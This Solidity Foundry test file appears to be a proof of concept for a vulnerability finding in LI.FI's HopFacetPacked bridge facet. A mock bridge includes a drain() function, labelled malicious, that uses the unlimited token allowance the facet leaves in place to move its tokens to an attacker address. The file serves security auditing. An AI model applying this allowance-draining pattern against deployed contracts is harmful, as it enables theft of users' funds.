// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {HopFacetPacked} from "lifi/Facets/HopFacetPacked.sol";
import {IHopBridge} from "lifi/Interfaces/IHopBridge.sol";

contract MockHopBridge is IHopBridge {
    address public token;

    constructor(address _token) { token = _token; }

    function sendToL2(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        address,
        uint256
    ) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function swapAndSend(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256
    ) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function send(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        uint256
    ) external override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    // malicious function to drain tokens using remaining allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract HopFacetPackedAllowanceTest is Test {
    MockERC20 internal token;
    MockHopBridge internal bridge;
    HopFacetPacked internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockHopBridge(address(token));
        facet = new HopFacetPacked(address(0), address(0));

        address[] memory bridges = new address[](1);
        address[] memory tokensToApprove = new address[](1);
        bridges[0] = address(bridge);
        tokensToApprove[0] = address(token);
        vm.prank(address(0));
        facet.setApprovalForHopBridges(bridges, tokensToApprove);

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        facet.startBridgeTokensViaHopL2ERC20Min(
            bytes8("tx"),
            address(0x1234),
            2,
            address(token),
            10 ether,
            0,
            0,
            0,
            block.timestamp + 1,
            address(bridge)
        );

        // allowance remains set after bridging
        assertEq(token.allowance(address(facet), address(bridge)), type(uint256).max);

        // attacker sends tokens to facet and bridge drains them
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

